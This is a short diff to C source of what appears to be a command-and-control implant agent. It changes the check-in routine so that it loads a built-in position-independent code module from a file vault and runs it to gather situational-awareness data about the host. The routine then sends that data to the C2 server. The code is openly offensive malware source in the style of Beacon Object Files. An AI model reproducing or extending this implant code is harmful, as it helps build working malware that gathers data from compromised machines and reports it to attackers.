@@ -77,13 +77,15 @@ void free_checkin_reply(CheckinReply *reply) {
 	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
 }
 
-BOOL perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *reply) {
+BOOL perform_checkin(AgentState *state, CheckinReply *reply) {
 	// Generate checkin payload.
 	CheckinRequest checkin = { 0 };
 	checkin.payload_uuid = clone_str(state->params.payload_uuid);
 	
 	// Use the checkin PICO to gather basic situational awareness info, if possible.
-	cap->CheckinPicoEntrypoint(&checkin);
+	ResolvedPico pico = resolve_loaded_pico(&state->file_vault, "_builtin_checkin");
+	CHECKIN_PICO entrypoint = (CHECKIN_PICO) pico.entrypoint;
+	entrypoint(&checkin);
 	
 	// Send checkin payload to C2 server.
 	char *msg = generate_checkin_message(&checkin);
@@ -101,6 +103,7 @@ BOOL perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *re
 	}
 	
 	// Free unneeded allocations.
+	free_resolved_pico(&pico);
 	free_checkin_request(&checkin);
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
 	MSVCRT$free(response.body);
